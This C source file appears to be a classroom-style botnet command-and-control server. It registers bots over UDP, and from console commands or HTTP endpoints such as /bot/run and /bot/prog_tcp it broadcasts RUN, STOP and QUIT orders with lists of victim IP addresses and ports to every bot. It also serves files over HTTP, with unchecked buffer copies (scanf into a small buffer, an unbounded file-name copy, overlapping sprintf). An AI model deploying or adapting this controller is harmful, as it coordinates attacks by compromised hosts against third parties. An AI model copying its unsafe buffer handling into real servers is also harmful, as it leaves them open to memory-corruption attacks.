#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <err.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/select.h>

#include "net_functions.h"

#define STDIN 0
#define MAXLEN 1400



typedef struct victim {
	char ip[INET_ADDRSTRLEN];
	char port[22];
} victim;

typedef struct MSG {
	char command;
	victim victims[20];
} MSG;



void printHelp() {
	printf("\nHelp:\n");
	printf("CandC [tcp_port]\ntcp_port - TCP port (default: 80 - http)\n\n");
	return;
}
void printStdin() {
	printf("\nSTDIN options:\n");
	printf("pt... bot klijentima salje poruku PROG_TCP\n\tstruct MSG:1 10.0.0.20 1234\n");
	printf("pt1.. bot klijentima salje poruku PROG_TCP\n\tstruct MSG:1 127.0.0.1 1234\n");
	printf("pu... bot klijentima salje poruku PROG_UDP\n\tstruct MSG:2 10.0.0.20 1234\n");
	printf("pu1.. bot klijentima salje poruku PROG_UDP\n\tstruct MSG:2 127.0.0.1 1234\n");
	printf("r.... bot klijentima salje poruku RUN s adresama localhosta\n\tstruct MSG:3 127.0.0.1 vat  localhost 6789\n");
	printf("r2... bot klijentima salje poruku RUN s adresama iz IMUNES-a\n\tstruct MSG:3 20.0.0.11 1111  20.0.0.12 2222  20.0.0.13 dec-notes\n");
	printf("s.... bot klijentima salje poruku STOP struct MSG:4\n");
	printf("l.... lokalni ispis adresa bot klijenata\n");
	printf("n.... salje poruku 'nepoznata'\n");
	printf("q.... bot klijentima salje poruku QUIT i zavrsava sa radom (struct MSG:0)\n");
	printf("h.... ispis naredbi\n\n");
	return;
}





int main(int argc, char *argv[]) {
	
	char debug = (char)(1);		/* change if you want to debug */
	
	/* basic */
	char a, userInput[25];
	int err123 = 0, onFlag = 1, i, j;
	
	/* messages */
	char notAllowedStr[150] = "HTTP/1.1 405 Method Not Allowed\r\nConnection: Close\r\n\r\n";
	char restResponse1[150] = "HTTP/1.1 200 OK\r\nContent-Length: 4\r\nConnection: Close\r\nContent-Type: text/plain\r\n; charset=utf-8\r\n\r\nDone";
	char restRespList[500];
	
	/* UDP */
	char UDPport[10] = "5555";
	int sockUDP;
	struct addrinfo UDPHints, *UDPRes;
	struct sockaddr cli;
	socklen_t cllen;
	
	/* UDP - buff */
	int msglen;
	char buff[512];
	
	/* UDP - bots */
	struct sockaddr bots[50];
	socklen_t botsLen[50];
	int nBots = 0;
	char reg[10] = "REG\n";
	int botPort;
	char botIP[75];
	
	 /* UDP - struct */
	struct MSG commands;
	
	
	/* TCP */
	char *TCPport;
	int sockTCP, newTCP;
	struct addrinfo TCPHints, *TCPRes;
	ssize_t recvLen;
	
	/* TCP - buff */
	char buffTCP[1024];
	char buffTCP2[1024];
	
	/* file */
	char fileName[75];
	char fileExt[25];
	FILE *locFile;
	char fileBuff[MAXLEN];
	int fileBuffSize, fileSize;
	
	
	/* select */
	fd_set currentSet, readySet;
	
	
	
	
	
	/* set default values */
	FD_ZERO(&currentSet);
	
	
	/* read input */
	if( argc != 1 && argc != 2 ) {
		printHelp();
		return 1;
	}
	if( argc == 2 ) {
		TCPport = argv[argc-1];
	} else {
		TCPport = malloc( 10*sizeof(char) );
		memset(TCPport, 0, sizeof(*TCPport));
		sprintf(TCPport, "%d", 80);
	}
	if(debug) {
		printf("TCPport = %s, UDPport = %s\n", TCPport, UDPport);
	}
	
	
	/* set UDP */
	memset(&UDPHints, 0, sizeof(UDPHints));
	UDPHints.ai_family = AF_INET;
	UDPHints.ai_socktype = SOCK_DGRAM;
	UDPHints.ai_protocol = IPPROTO_UDP;
	UDPHints.ai_flags |= AI_PASSIVE;
	
	getaddrinfo(NULL, UDPport, &UDPHints, &UDPRes);
	if(err123) {
		errx(10, "\n\n getaddrinfo: %s\n", gai_strerror(err123));
	}
	
	sockUDP = Socket(UDPRes->ai_family, UDPRes->ai_socktype, UDPRes->ai_protocol);
	if( setsockopt(sockUDP, SOL_SOCKET, SO_REUSEADDR, &onFlag, sizeof(int)) == -1 ) {
		err(21, "\n\nNet problem - setsockopt (exit code 21)\n");
	}
	
	Bind(sockUDP, UDPRes->ai_addr, UDPRes->ai_addrlen);
	
	
	/* set TCP */
	memset(&TCPHints, 0, sizeof(TCPHints));
	TCPHints.ai_family = AF_INET;
	TCPHints.ai_socktype = SOCK_STREAM;
	TCPHints.ai_protocol = IPPROTO_TCP;
	TCPHints.ai_flags |= AI_PASSIVE;
	
	getaddrinfo(NULL, TCPport, &TCPHints, &TCPRes);
	if(err123) {
		errx(10, "\n\n getaddrinfo: %s\n", gai_strerror(err123));
	}
	
	sockTCP = Socket(TCPRes->ai_family, TCPRes->ai_socktype, TCPRes->ai_protocol);
	if( setsockopt(sockTCP, SOL_SOCKET, SO_REUSEADDR, &onFlag, sizeof(int)) == -1 ) {
		err(21, "\n\nNet problem - setsockopt (exit code 21)\n");
	}
	
	Bind(sockTCP, TCPRes->ai_addr, TCPRes->ai_addrlen);
	
	
	/* add STDIN, sockUDP, sockTCP to currentSet */
	FD_SET(STDIN, &currentSet);
	FD_SET(sockUDP, &currentSet);
	FD_SET(sockTCP, &currentSet);
	
	
	/* work */
	while(1) {
		readySet = currentSet;
		
		Listen(sockTCP, 1);
		
		memset(&commands, 0, sizeof(commands));
		
		if( select(FD_SETSIZE, &readySet, NULL, NULL, NULL) < 0 ) {
			err(28, "\nselect problem (exit code 28)\n");
		}
		
		
		if( FD_ISSET(STDIN, &readySet) ) {
		/* STDIN */
			scanf("%s", userInput);
			
			
			
			if( strcmp(userInput, "pt") == 0 ) {
				if(debug)
					printf("\nUser typed 'pt'\n");
				commands.command = '1';
				sprintf(commands.victims[0].ip, "10.0.0.20");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "pt1") == 0 ) {
				if(debug)
					printf("\nUser typed 'pt1'\n");
				commands.command = '1';
				sprintf(commands.victims[0].ip, "127.0.0.1");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "pu") == 0 ) {
				if(debug)
					printf("\nUser typed 'pu'\n");
				commands.command = '2';
				sprintf(commands.victims[0].ip, "10.0.0.20");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "pu1") == 0 ) {
				if(debug)
					printf("\nUser typed 'pu1'\n");
				commands.command = '2';
				sprintf(commands.victims[0].ip, "127.0.0.1");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "r") == 0 ) {
				if(debug)
					printf("\nUser typed 'r'\n");
				commands.command = '3';
				sprintf(commands.victims[0].ip, "127.0.0.1");
				sprintf(commands.victims[0].port, "vat");
				sprintf(commands.victims[1].ip, "localhost");
				sprintf(commands.victims[1].port, "6789");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "r2") == 0 ) {
				if(debug)
					printf("\nUser typed 'r2'\n");
				commands.command = '3';
				sprintf(commands.victims[0].ip, "20.0.0.11");
				sprintf(commands.victims[0].port, "1111");
				sprintf(commands.victims[1].ip, "20.0.0.12");
				sprintf(commands.victims[1].port, "2222");
				sprintf(commands.victims[2].ip, "20.0.0.13");
				sprintf(commands.victims[2].port, "dec-notes");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "s") == 0 ) {
				if(debug)
					printf("\nUser typed 's'\n");
				commands.command = '4';
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "l") == 0 ) {
				if(debug)
					printf("\nUser typed 'l'\n");
				printf("\nBot list (nBots = %d)\n", nBots);
				for(i = 0; i<nBots; i++) {
					botPort = htons( ((struct sockaddr_in *)(&bots[i]))->sin_port );
					inet_ntop(AF_INET, &( ((struct sockaddr_in *)(&bots[i]))->sin_addr ), botIP, INET_ADDRSTRLEN);
					printf("(%d) %s %d\t", i+1, botIP, botPort);
				}
				
			} else if( strcmp(userInput, "n") == 0 ) {
				if(debug)
					printf("\nUser typed 'n'\n");
				commands.command = 'n';
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strcmp(userInput, "q") == 0 ) {
				if(debug)
					printf("\nUser typed 'q'\n");
				commands.command = '0';
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
				/* terminate */
				return 0;
				
			} else {
				if(debug)
					printf("\nUser typed %s\n", userInput);
				
				printStdin();
			}
			
			
			do{
				/* 'eat' remaining input */
				a=getchar();
				if(debug)
					putchar(a);
			}while(a!='\n');
			
		} else if( FD_ISSET(sockUDP, &readySet) ) {
		/* UDP */
			cllen = sizeof(cli);
			memset(buff, (char) 0, sizeof(buff));
			msglen = recvfrom(sockUDP, buff, 512, 0, &cli, &cllen);
			
			if(debug) {
				printf("\nRecieved (UDP): %s\n", buff);
			}
			
			if( strcmp(buff, reg) == 0 ) {
				
				bots[nBots] = cli;
				botsLen[nBots] = cllen;
				
				if(debug) {
					botPort = htons( ((struct sockaddr_in *)(&bots[nBots]))->sin_port );
					inet_ntop(AF_INET, &( ((struct sockaddr_in *)(&bots[nBots]))->sin_addr ), botIP, INET_ADDRSTRLEN);
					printf("\nBot (%d) %s %d registered\n", nBots+1, botIP, botPort);
				}
				
				nBots++;
				
				//sendto(sockUDP, messageIn, strlen(messageIn), 0, &cli, cllen);
				
			} else {
				if(debug) {
					printf("\nBot not registered\n");
				}
			}
			
			
		} else if( FD_ISSET(sockTCP, &readySet) ) {
		/* TCP */
			if(debug)
				printf("\nHTTP start\n");
			
			newTCP = Accept(sockTCP, NULL, NULL);
			memset(buffTCP, (char) 0, sizeof(buffTCP));
			recvLen = recv(newTCP, buffTCP, 1024, 0);
			if( recvLen < 0 ) {
				err(100, "\n\nNet problem - recv (exit code 100)\n");
			}
			
			if(debug) {
				printf("\n\nTCP:\n");
				for(i = 0; i<recvLen; i++) {
					printf("%c", buffTCP[i]);
				}
				printf("\n\n");
			}
			
			
			/* REST */
			if( strncmp(buffTCP, "GET /bot/prog_tcp_localhost", strlen("GET /bot/prog_tcp_localhost")) == 0 ) {
				if(debug)
					printf("\nUser typed 'pt1'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '1';
				sprintf(commands.victims[0].ip, "127.0.0.1");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/prog_tcp", strlen("GET /bot/prog_tcp")) == 0 ) {
				if(debug)
					printf("\nUser typed 'pt'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '1';
				sprintf(commands.victims[0].ip, "10.0.0.20");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/prog_udp_localhost", strlen("GET /bot/prog_udp_localhost")) == 0 ) {
				if(debug)
					printf("\nUser typed 'pu1'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '2';
				sprintf(commands.victims[0].ip, "127.0.0.1");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/prog_udp", strlen("GET /bot/prog_udp")) == 0 ) {
				if(debug)
					printf("\nUser typed 'pu'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '2';
				sprintf(commands.victims[0].ip, "10.0.0.20");
				sprintf(commands.victims[0].port, "1234");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/run2", strlen("GET /bot/run2")) == 0 ) {
				if(debug)
					printf("\nUser typed 'r2'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '3';
				sprintf(commands.victims[0].ip, "20.0.0.11");
				sprintf(commands.victims[0].port, "1111");
				sprintf(commands.victims[1].ip, "20.0.0.12");
				sprintf(commands.victims[1].port, "2222");
				sprintf(commands.victims[2].ip, "20.0.0.13");
				sprintf(commands.victims[2].port, "dec-notes");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/run", strlen("GET /bot/run")) == 0 ) {
				if(debug)
					printf("\nUser typed 'r'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '3';
				sprintf(commands.victims[0].ip, "127.0.0.1");
				sprintf(commands.victims[0].port, "vat");
				sprintf(commands.victims[1].ip, "localhost");
				sprintf(commands.victims[1].port, "6789");
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/stop", strlen("GET /bot/stop")) == 0 ) {
				if(debug)
					printf("\nUser typed 's'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '4';
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
			} else if( strncmp(buffTCP, "GET /bot/list", strlen("GET /bot/list")) == 0 ) {
				if(debug)
					printf("\nUser typed 'l'\n");
				
				printf("\nBot list (nBots = %d)\n", nBots);
				sprintf(buffTCP2, "Bot list (nBots = %d)\r\n", nBots);
				for(i = 0; i<nBots; i++) {
					botPort = htons( ((struct sockaddr_in *)(&bots[i]))->sin_port );
					inet_ntop(AF_INET, &( ((struct sockaddr_in *)(&bots[i]))->sin_addr ), botIP, INET_ADDRSTRLEN);
					printf("(%d) %s %d\t", i+1, botIP, botPort);
					sprintf(buffTCP2, "%s(%d) %s %d\r\n", buffTCP2, i+1, botIP, botPort);
				}
				
				sprintf(restRespList, "HTTP/1.1 200 OK\r\nContent-Length: %d\r\n", strlen(buffTCP2));
				sprintf(restRespList, "%sConnection: Close\r\nContent-Type: text/plain\r\n; charset=utf-8\r\n\r\n",
					restRespList);
				sprintf(restRespList, "%s%s",restRespList, buffTCP2);
				
				err123 = send(newTCP, restRespList, strlen(restRespList), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
			} else if( strncmp(buffTCP, "GET /bot/quit", strlen("GET /bot/quit")) == 0 ) {
				if(debug)
					printf("\nUser typed 'q'\n");
				
				err123 = send(newTCP, restResponse1, strlen(restResponse1), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
				
				commands.command = '0';
				for(i = 0; i<nBots; i++) {
					sendto(sockUDP, &commands, sizeof(commands), 0, &bots[i], botsLen[i]);
				}
				
				/* terminate */
				return 0;
				
			} else if( strncmp(buffTCP, "GET", 3) == 0 ) {
			/* GET ... */
				if( buffTCP[5] == ' ' ) {
				/* index.html */
					sprintf(fileName, "index.html");
					
				} else {
				/* document name */
					for(i = 0; buffTCP[i+5] != ' '; i++) {
						if(buffTCP[i+5] == '/') {
							/* subDir - not supported */
							break;
						}
						fileName[i] = buffTCP[i+5];
					}
					fileName[i] = (char) 0;
				}
				
				for(i = 0; i < strlen(fileName); i++) {
					if( fileName[i] == '.' ) {
						j = i+1;
					}
				}
				for(i = 0; fileName[i+j] != (char) 0; i++) {
					fileExt[i] = fileName[i+j];
				}
				fileExt[i] = (char) 0;
				
				if(debug) {
					printf("\nIme datoteke: %s, nastavak: %s\n", fileName, fileExt);
				}
				
				if( (strcmp(fileExt, "html") != 0) && (strcmp(fileExt, "txt") != 0) && 
					(strcmp(fileExt, "jpg") != 0) && (strcmp(fileExt, "gif") != 0) && (strcmp(fileExt, "pdf") != 0) ) {
				/* file not supported */
					if(debug) {
						printf("\nNepodrzan tip datoteke\n");
					}
					
					sprintf(buffTCP2, "%s", notAllowedStr);
					err123 = send(newTCP, buffTCP2, strlen(buffTCP2), 0);
					if(err123 < 0) {
						err(101, "\n\nNet problem - send (exit code 101)\n");
					}
					
				} else {
				/* file supported */
					locFile = fopen(fileName, "rb");
					
					
					if( locFile == NULL ) {
						if(debug) {
							printf("\nFile %s error\n", fileName);
						}
						
						sprintf(buffTCP2, "%s", notAllowedStr);
						err123 = send(newTCP, buffTCP2, strlen(buffTCP2), 0);
						if(err123 < 0) {
							err(101, "\n\nNet problem - send (exit code 101)\n");
						}
						
						
					} else {
						fseek(locFile, 0, SEEK_END);
						fileSize = ftell(locFile);
						fseek(locFile, 0, SEEK_SET);
						
						if(debug) {
							printf("\nFile %s size: %d\n", fileName, fileSize);
						}
						
						sprintf(buffTCP2, "HTTP/1.1 200 OK\r\nContent-Length: %d\r\n", fileSize);
						sprintf(buffTCP2, "%sConnection: close\r\nContent-Type: ", buffTCP2);
						
						if( strcmp(fileExt, "html") == 0 ) {
							sprintf(buffTCP2, "%stext/html; charset=utf-8\r\n\r\n", buffTCP2);
							
						} else if( (strcmp(fileExt, "txt") == 0) ) {
							sprintf(buffTCP2, "%stext/plain; charset=utf-8\r\n\r\n", buffTCP2);
							
						} else if( strcmp(fileExt, "gif") == 0 ) {
							sprintf(buffTCP2, "%simage/gif\r\n\r\n", buffTCP2);
							
						} else if( strcmp(fileExt, "jpg") == 0 ) {
							sprintf(buffTCP2, "%simage/jpg\r\n\r\n", buffTCP2);
							
						} else if( strcmp(fileExt, "pdf") == 0 ) {
							sprintf(buffTCP2, "%sapplication/pdf\r\n\r\n", buffTCP2);	
						}
						
						if(debug) {
							printf("\nSaljem:\n%s\nSada ide datoteka ...", buffTCP2);
						}
						
						err123 = send(newTCP, buffTCP2, strlen(buffTCP2), 0);
						if(err123 < 0) {
							err(101, "\n\nNet problem - send (exit code 101)\n");
						}
						
						/* send file */
						while( !feof(locFile) ) {
							memset(fileBuff, '\0', sizeof(fileBuff));
							fileBuffSize = fread (fileBuff, sizeof (char), MAXLEN, locFile);
							if(fileBuffSize < 0) {
								err(200, "\n\nFile read problem (exit code 200)\n");
							}
							
							err123 = send(newTCP, fileBuff, (sizeof (char))*fileBuffSize, 0);
							if(err123 < 0) {
								err(101, "\n\nNet problem - send (exit code 101)\n");
							}
						}
						if(debug) {
							printf("\nFile %s sent\n", fileName);
						}
					}
					
				} /* file supported end */
				
			/* GET ... end*/
			} else {
			/* Method Not Allowed */
				sprintf(buffTCP2, "%s", notAllowedStr);
				err123 = send(newTCP, buffTCP2, strlen(buffTCP2), 0);
				if(err123 < 0) {
					err(101, "\n\nNet problem - send (exit code 101)\n");
				}
			}
			
			
			close(newTCP);
			
			if(debug) {
				printf("\nHTTP done\n");
			}
			
		} else {
			if(debug)
				printf("\nunknown data from select\n");
		}
		
	} //while(1)
	
	return 0;
}






























